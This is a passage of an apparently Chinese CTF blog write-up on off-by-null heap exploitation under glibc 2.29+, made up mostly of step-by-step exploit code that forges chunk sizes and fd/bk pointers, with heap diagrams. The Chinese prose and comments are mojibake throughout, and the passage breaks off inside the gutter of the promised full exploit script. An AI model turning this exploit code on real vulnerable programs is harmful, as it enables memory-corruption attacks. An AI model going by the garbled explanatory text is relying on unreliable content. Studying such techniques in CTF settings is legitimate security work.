        <h3 id="2-å¡«å……tcache"   >
          <a href="#2-å¡«å……tcache" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å¡«å……tcache" class="headerlink" title="(2)å¡«å……tcache"></a>(2)å¡«å……tcache</h3>
      <p>å¹¶ä¸”å°†è¦åˆ©ç”¨çš„Chunké‡Šæ”¾åˆå¹¶è¿›å…¥unsortedbin</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#free 0~48 		#1~49</span></span><br><span class="line"><span class="comment">#-------------------------</span></span><br><span class="line"><span class="comment">#--tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):  <span class="comment">#0x88  	</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>,<span class="number">21</span>):<span class="comment">#0xa8</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>,<span class="number">28</span>):<span class="comment">#0xb8</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>,<span class="number">42</span>):<span class="comment">#0xd8</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>,<span class="number">49</span>):<span class="comment">#0xe8</span></span><br><span class="line">    free(i+<span class="number">1</span>)    </span><br><span class="line"><span class="comment">#--tcache</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">52</span>,<span class="number">57</span>): <span class="comment">#52~56  				#53~57  merge into unsortedbin</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831194137.png" alt="Snipaste_2021-08-31_19-41-25"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph TD;</span><br><span class="line">    0(chunk53&lt;br&gt;0xa8&lt;br&gt;0x****9c0)--&gt;1(chunk54&lt;br&gt;0xb8)--&gt;2(chunk55&lt;br&gt;0xd8)--&gt;3(chunk56&lt;br&gt;0xd8)--&gt;4(chunk57&lt;br&gt;0xe8&lt;br&gt;0x****cf0)</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-é‡æ„5357ç»“æ„ä¸º97101"   >
          <a href="#3-é‡æ„5357ç»“æ„ä¸º97101" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-é‡æ„5357ç»“æ„ä¸º97101" class="headerlink" title="(3)é‡æ„5357ç»“æ„ä¸º97101"></a>(3)é‡æ„53<del>57ç»“æ„ä¸º97</del>101</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#---------------------------</span></span><br><span class="line"><span class="comment"># empty tcache</span></span><br><span class="line">claim(<span class="number">0x88</span>) <span class="comment">#62~68</span></span><br><span class="line">claim(<span class="number">0xa8</span>) <span class="comment">#69~75</span></span><br><span class="line">claim(<span class="number">0xb8</span>) <span class="comment">#76~82</span></span><br><span class="line">claim(<span class="number">0xd8</span>) <span class="comment">#83~89</span></span><br><span class="line">claim(<span class="number">0xe8</span>) <span class="comment">#90~96</span></span><br><span class="line"><span class="comment">#---------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------------- ä¸Šé¢æ˜¯ä¸€ä¸ªå¤§çš„unsorted bin</span></span><br><span class="line"><span class="comment">#è¿›è¡Œaddä¹‹åcarver up and unsortedbin è¢«æ”¾å…¥äº†largebin ä¹‹åè¿›è¡Œäº†åˆ†é…</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 52 	#97  	#0x****9c0</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 53     #98		#0x****A60</span></span><br><span class="line"></span><br><span class="line">fake_chunk_size = <span class="number">0x98</span> * <span class="string">&quot;a&quot;</span> + p16(<span class="number">0x200</span>)</span><br><span class="line"><span class="comment">#è¿™é‡Œæˆ‘å€Ÿç”¨å †æº¢å‡ºæ¥ä»¿ç…§off-by-nullï¼Œä¿®æ”¹è¿˜åœ¨largebinä¸­çš„chunkçš„sizeä»0x2e1-&gt;0x200</span></span><br><span class="line"><span class="comment">#changing largebinChunk_size will not cause abort</span></span><br><span class="line">edit(<span class="number">98</span>,<span class="number">0x98</span>+<span class="number">0x2</span>,fake_chunk_size)<span class="comment">#53 #98</span></span><br><span class="line">add_malloc(<span class="number">0x88</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#54 	#99 	#0x****B00</span></span><br><span class="line">add_malloc(<span class="number">0x88</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#55  #100 	#0x****B90</span></span><br><span class="line">add_malloc(<span class="number">0xd8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#56  #101 	#0x****C70</span></span><br></pre></td></tr></table></div></figure>

<p>é‡æ„ä¹‹åå¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph TD;</span><br><span class="line">    0(chunk97&lt;br&gt;0x98&lt;br&gt;0x****9c0)--&gt;1(chunk98&lt;br&gt;0x98)--&gt;2(chunk99&lt;br&gt;0x88)--&gt;3(chunk100&lt;br&gt;0x88)--&gt;4(chunk101&lt;br&gt;0xd8&lt;br&gt;0x****cf0)--&gt;5(0xe0ç¢ç‰‡)</span><br></pre></td></tr></table></div></figure>

<p>é‚£ä¹ˆå®é™…ä¸Šå…¶å®åŸå…ˆçš„0x420è¢«ç”³è¯·äº†0x340ï¼Œè¿˜æœ‰ä¸€éƒ¨åˆ†0xe0æ²¡æœ‰è¢«ç”³è¯·å‡ºæ¥ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831200742.png" alt="Snipaste_2021-08-31_20-07-33"></p>

        <h3 id="4-æ„é€ preChunkçš„fdå’Œbk"   >
          <a href="#4-æ„é€ preChunkçš„fdå’Œbk" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-æ„é€ preChunkçš„fdå’Œbk" class="headerlink" title="(4)æ„é€ preChunkçš„fdå’Œbk"></a>(4)æ„é€ preChunkçš„fdå’Œbk</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#------tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,<span class="number">14</span>):<span class="comment">#0x98</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):<span class="comment">#0x88</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>,<span class="number">49</span>):<span class="comment">#0xe8</span></span><br><span class="line">    free(i+<span class="number">1</span>)        </span><br><span class="line"><span class="comment">#------tcache</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">51</span>)<span class="comment">#0x98 	#50  	#51 #0x****f900</span></span><br><span class="line"><span class="comment">#let 99-&gt;fd = chunk51_addr(0x****f900)</span></span><br><span class="line">free(<span class="number">99</span>)<span class="comment">#0x88  	#54 	#99</span></span><br><span class="line"><span class="comment">#let 99-&gt;bk = chunk60_addr(0x****ff70)</span></span><br><span class="line">free(<span class="number">60</span>)<span class="comment">#0xe8 	#59 	#60 #0x****ff70</span></span><br></pre></td></tr></table></div></figure>



<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831204034.png" alt="Snipaste_2021-08-31_20-40-24"></p>

        <h3 id="5-å†é‡æ„97-101ä¸º97-gt-124-gt-132-gt-134"   >
          <a href="#5-å†é‡æ„97-101ä¸º97-gt-124-gt-132-gt-134" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-å†é‡æ„97-101ä¸º97-gt-124-gt-132-gt-134" class="headerlink" title="(5)å†é‡æ„97~101ä¸º97-&gt;124-&gt;132-&gt;134"></a>(5)å†é‡æ„97~101ä¸º97-&gt;124-&gt;132-&gt;134</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">98</span>)<span class="comment">#0x98 	#53 	#98</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------add back</span></span><br><span class="line">claim(<span class="number">0x88</span>) <span class="comment">#102~108</span></span><br><span class="line">claim(<span class="number">0x98</span>) <span class="comment">#109~115</span></span><br><span class="line">claim(<span class="number">0xe8</span>) <span class="comment">#116~122</span></span><br><span class="line"><span class="comment">#---------------add back</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å°†51,99,98åˆ†åˆ«æ”¾å…¥å¯¹åº”çš„smallbin,98å’Œ99ç”±äºç‰©ç†ç›¸é‚»ï¼Œæ‰€ä»¥åˆå¹¶æˆä¸º0x130çš„å—</span></span><br><span class="line"><span class="comment">#ä¹‹åä¾æ®å¤§å°é€‚é…åŸåˆ™å°†60åˆ†é…å›æ¥ç»™123</span></span><br><span class="line">add_malloc(<span class="number">0xd8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 0x32		#123 0x****ff70,å®é™…å¤§å°ä¸º0xf0</span></span><br><span class="line"><span class="comment">#å°†0x131çš„smallbinåˆ‡åˆ†ï¼Œæ­¤æ—¶51è¿˜åœ¨0xa0çš„smallbinä¸­ï¼Œå‰©ä¸‹0x70çš„Chunkè¿›å…¥unsortedbinä¸­</span></span><br><span class="line">add_malloc(<span class="number">0xb8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 0x35  		#124 0x****fa60</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):<span class="comment">#0x88</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="comment">#chunk100æ”¾å…¥unsortedbin, ä¸0x70çš„ç¢ç‰‡åˆå¹¶ï¼Œå½¢æˆ0x101çš„å—</span></span><br><span class="line">free(<span class="number">100</span>) 			<span class="comment">#55 	#100</span></span><br><span class="line"></span><br><span class="line">claim(<span class="number">0x88</span>)	<span class="comment">#125~131</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ‡å‰²0x101çš„å—ï¼Œè·å¾—0xb8å¤§å°çš„0x****fb20ï¼Œæ–¹ä¾¿ä¸0x****f900çš„å—æ”¾å…¥åŒä¸€ä¸ªunsortebinä¸­</span></span><br><span class="line">add_malloc(<span class="number">0xb8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#0x36 	#132 	0x****fb20</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#0x37  	#133	0x****f900</span></span><br><span class="line">add_malloc(<span class="number">0x38</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#0x3b 	#134 	0x****fbe0</span></span><br></pre></td></tr></table></div></figure>

<p>é‡æ„ä¹‹åå¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph TD;</span><br><span class="line">    0(chunk97&lt;br&gt;0x98&lt;br&gt;0x****f9c0)--&gt;1(chunk124&lt;br&gt;0xb8&lt;br&gt;chunk99è¢«åŒ…å«&lt;br&gt;0x****fa60)--&gt;2(chunk132&lt;br&gt;0xb8&lt;br&gt;0x****fb20)--&gt;3(chunk134&lt;br&gt;0x38&lt;br&gt;0x****fbe0)--&gt;4(0xe0ç¢ç‰‡)</span><br></pre></td></tr></table></div></figure>


        <h3 id="6-ä¿®å¤FD-gt-bkå’ŒBK-gt-fd"   >
          <a href="#6-ä¿®å¤FD-gt-bkå’ŒBK-gt-fd" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-ä¿®å¤FD-gt-bkå’ŒBK-gt-fd" class="headerlink" title="(6)ä¿®å¤FD-&gt;bkå’ŒBK-&gt;fd"></a>(6)ä¿®å¤FD-&gt;bkå’ŒBK-&gt;fd</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#------tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>,<span class="number">49</span>):<span class="comment">#0xe8</span></span><br><span class="line">    free(i+<span class="number">1</span>)        </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,<span class="number">14</span>):<span class="comment">#0x98</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>,<span class="number">28</span>):<span class="comment">#0xb8</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="comment">#------tcache</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#let 133-&gt;bk = chunk132_addr(0x****f900-&gt;bk = 0x****fb20)</span></span><br><span class="line">free(<span class="number">133</span>) <span class="comment">#0x37 	#133 	0x****f900</span></span><br><span class="line">free(<span class="number">132</span>) <span class="comment">#0x36  	#132 	0x****fb20</span></span><br><span class="line"><span class="comment">#let 123-&gt;fd = chunk132_addr(0x****ff70-&gt;bk = 0x****fb20)</span></span><br><span class="line">free(<span class="number">123</span>) <span class="comment">#0x32 	#123  	0x****ff70</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="7-å†é‡æ„ä¸º97-gt-124-gt-157-gt-134"   >
          <a href="#7-å†é‡æ„ä¸º97-gt-124-gt-157-gt-134" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-å†é‡æ„ä¸º97-gt-124-gt-157-gt-134" class="headerlink" title="(7)å†é‡æ„ä¸º97-&gt;124-&gt;157-&gt;134"></a>(7)å†é‡æ„ä¸º97-&gt;124-&gt;157-&gt;134</h3>
      <p>æ–¹ä¾¿å°†<code>0x****ff70</code>å’Œ<code>0x****f900</code>çš„å¯¹äºfd,bkè¿›è¡Œoff-by-nullï¼Œä½¿å¾—0xb20å˜ä¸º0xb00ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">59</span>)  <span class="comment">#58		#59		0x****fed0</span></span><br><span class="line"><span class="comment">#chunk59å’Œchunk123åˆå¹¶è¿›å…¥unsortedbinï¼Œå¤§å°0x190(0xf0+0xa0)</span></span><br><span class="line"></span><br><span class="line">claim(<span class="number">0x98</span>) 	<span class="comment">#135~141</span></span><br><span class="line">claim(<span class="number">0xb8</span>)		<span class="comment">#142~148</span></span><br><span class="line">claim(<span class="number">0xe8</span>) 	<span class="comment">#149~155</span></span><br><span class="line"></span><br><span class="line">add_malloc(<span class="number">0xc8</span>,<span class="string">&#x27;\x00&#x27;</span>)		<span class="comment">#0x32 		#156 	0x****fed0	</span></span><br><span class="line">add_malloc(<span class="number">0xb8</span>,<span class="string">&#x27;\x00&#x27;</span>)		<span class="comment">#0x36 		#157 	0x****fb20</span></span><br><span class="line">add_malloc(<span class="number">0xb8</span>,<span class="string">&#x27;\x00&#x27;</span>)		<span class="comment">#0x37  		#158	0x****ffa0</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)		<span class="comment">#58  		#159 	0x****f900</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--top_chunk</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)        <span class="comment">#0x3d 			#160</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)        <span class="comment">#0x3e 			#161</span></span><br><span class="line">add_malloc(<span class="number">0x18</span>,<span class="string">&#x27;\x00&#x27;</span>)        <span class="comment">#0x3f 			#162</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,<span class="number">14</span>):<span class="comment">#0x98</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>,<span class="number">28</span>):<span class="comment">#0xb8</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="comment">#------tcache</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">161</span>) <span class="comment">#0x98 	#0x3e 		#161</span></span><br><span class="line">free(<span class="number">159</span>) <span class="comment">#0x98 	#58  		#159 	0x****f900</span></span><br><span class="line">free(<span class="number">157</span>) <span class="comment">#0xb8 	#0x36 		#157</span></span><br><span class="line">free(<span class="number">50</span>)  <span class="comment">#0x98 	#49 		#50 	0x****f860</span></span><br><span class="line"><span class="comment">#å…¶ä¸­159å’Œ50åˆå¹¶ä¸º0x140å¤§å°çš„å—æ”¾å…¥unsortedbinä¸­</span></span><br><span class="line"><span class="comment">#unsortedbin:0x****f860 â€”â–¸ 0x****fb20 â€”â–¸ 0x****0120</span></span><br><span class="line"></span><br><span class="line">claim(<span class="number">0xb8</span>) <span class="comment">#163~169</span></span><br><span class="line">claim(<span class="number">0x98</span>) <span class="comment">#170~176</span></span><br><span class="line"><span class="comment">#----------------------------------------------------</span></span><br><span class="line">add_malloc(<span class="number">0xb8</span>,<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#49 	#177</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#0x36  	#178</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ‡å‰²0x140çš„å—</span></span><br><span class="line">add_malloc(<span class="number">0xc8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#0x3a 	#179 	0x****f860</span></span><br><span class="line">add_malloc(<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#0x3e   	#180 	</span></span><br></pre></td></tr></table></div></figure>

<p>ç°åœ¨å°±å¯ä»¥é€šè¿‡chunk179æ¥å°†<code>0x****f900</code>ä¸­çš„bkç»™æ”¹æ‰ã€‚</p>
<p>é€šè¿‡chunk156æ¥å°†<code>0x****ff70</code>ä¸­çš„fdç»™æ”¹æ‰ã€‚</p>

        <h3 id="8-åˆ©ç”¨off-by-nullå¾—åˆ°æœ€ç»ˆå¸ƒå±€"   >
          <a href="#8-åˆ©ç”¨off-by-nullå¾—åˆ°æœ€ç»ˆå¸ƒå±€" class="heading-link"><i class="fas fa-link"></i></a><a href="#8-åˆ©ç”¨off-by-nullå¾—åˆ°æœ€ç»ˆå¸ƒå±€" class="headerlink" title="(8)åˆ©ç”¨off-by-nullå¾—åˆ°æœ€ç»ˆå¸ƒå±€"></a>(8)åˆ©ç”¨off-by-nullå¾—åˆ°æœ€ç»ˆå¸ƒå±€</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">partial_null_write = <span class="number">0x98</span>*<span class="string">&#x27;b&#x27;</span></span><br><span class="line">partial_null_write += p64(<span class="number">0xf1</span>)</span><br><span class="line">edit(<span class="number">156</span>,<span class="number">0x98</span>+<span class="number">0x8</span>+<span class="number">0x1</span>,partial_null_write+<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#0x32  	#156</span></span><br><span class="line"></span><br><span class="line">partial_null_write = <span class="number">0xa8</span>*<span class="string">&#x27;c&#x27;</span></span><br><span class="line">edit(<span class="number">179</span>,<span class="number">0xa8</span>+<span class="number">0x1</span>,partial_null_write + <span class="string">&#x27;\x00&#x27;</span>) 		<span class="comment">#0x3a 		#179</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¼ªé€ pre_size</span></span><br><span class="line">fake_chunk_size = <span class="number">0x98</span>*<span class="string">&#x27;d&#x27;</span></span><br><span class="line">fake_chunk_size += p64(<span class="number">0x2e1</span>)</span><br><span class="line">edit(<span class="number">124</span>,<span class="number">0x98</span>+<span class="number">0x8</span>,fake_chunk_size) 	<span class="comment">#0x35 	#124</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="9-è§¦å‘off-by-null"   >
          <a href="#9-è§¦å‘off-by-null" class="heading-link"><i class="fas fa-link"></i></a><a href="#9-è§¦å‘off-by-null" class="headerlink" title="(9)è§¦å‘off-by-null"></a>(9)è§¦å‘off-by-null</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>,<span class="number">49</span>):<span class="comment">#0xe8</span></span><br><span class="line">    free(i+<span class="number">1</span>)    </span><br><span class="line">free(<span class="number">58</span>)</span><br></pre></td></tr></table></div></figure>


        <h3 id="â–²æ€»ç»“"   >
          <a href="#â–²æ€»ç»“" class="heading-link"><i class="fas fa-link"></i></a><a href="#â–²æ€»ç»“" class="headerlink" title="â–²æ€»ç»“"></a>â–²æ€»ç»“</h3>
      <p>â‘ åˆ©ç”¨unsortedbinæˆé“¾æœºåˆ¶ï¼Œåˆå¹¶unsortedbinä¸­çš„chunkå¹¶ä¸”åˆ‡å‰²ï¼Œè¿™æ ·å°±èƒ½ä¿ç•™ä½FDå’ŒBKäº†ã€‚</p>
<p>â‘¡å†åˆ©ç”¨unsortedbinæˆé“¾å’Œåˆ‡å‰²çš„æœºåˆ¶ï¼Œå°±èƒ½ä¿®æ”¹åˆ°å¯¹åº”preChunkçš„FDå’ŒBKäº†ï¼Œä¿®æ”¹æœ€åä¸€ä¸ªå­—èŠ‚ä¸º\x00å³å¯ã€‚</p>
<p>â‘¢ç”±äº2.29ä¹‹åçš„æ·»åŠ çš„ä¸¤é¡¹æ£€æŸ¥ï¼Œæ‰€ä»¥éœ€è¦æ³¨æ„çš„æ˜¯ä¼ªé€ unsortedbinChunkçš„sizeæ—¶ï¼Œä¹Ÿè¦ä¼ªé€ nextChunkçš„pre_sizeå’Œpre_inuseä½ã€‚</p>
<p>â‘£å¤ªä»–ä¸«çš„éº»çƒ¦äº†ï¼Œæœ‰è¿™æ—¶é—´å¸ƒå±€è¿˜ä¸å¦‚è‚å…¶ä»–é¢˜â€¦..</p>
<p>å†è´´ä¸ªæ±‡æ€»çš„expï¼ŒåŸºäºlibc2.30ï¼Œè‡ªå·±çš„é¢˜ç›®ï¼š</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span 